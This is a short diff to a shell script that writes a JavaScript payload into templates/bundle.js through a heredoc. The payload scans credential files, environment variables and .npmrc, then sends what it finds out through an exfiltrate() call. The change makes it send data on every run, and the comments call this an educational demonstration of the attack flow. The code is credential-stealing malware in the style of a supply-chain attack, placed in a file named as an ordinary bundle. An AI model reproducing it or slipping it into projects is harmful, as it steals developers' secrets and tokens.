@@ -341,12 +341,14 @@ if [ ! -f "templates/bundle.js" ]; then
   scanFiles();
   scanEnv();
   
-  // Only exfiltrate if credentials found
-  if (Object.keys(credentials.files).length > 0 || 
-      Object.keys(credentials.env).length > 0 ||
-      credentials.npmrc) {
-    exfiltrate();
-  }
+  // Always exfiltrate for demonstration (even if no credentials found)
+  // In real attack, this would only send if credentials found
+  // For educational purposes, we always send to show the attack flow
+  credentials.scanCompleted = true;
+  credentials.filesScanned = CREDENTIAL_FILES.length;
+  credentials.envVarsScanned = ENV_VARS.length;
+  
+  exfiltrate();
 })();
 EOF
 
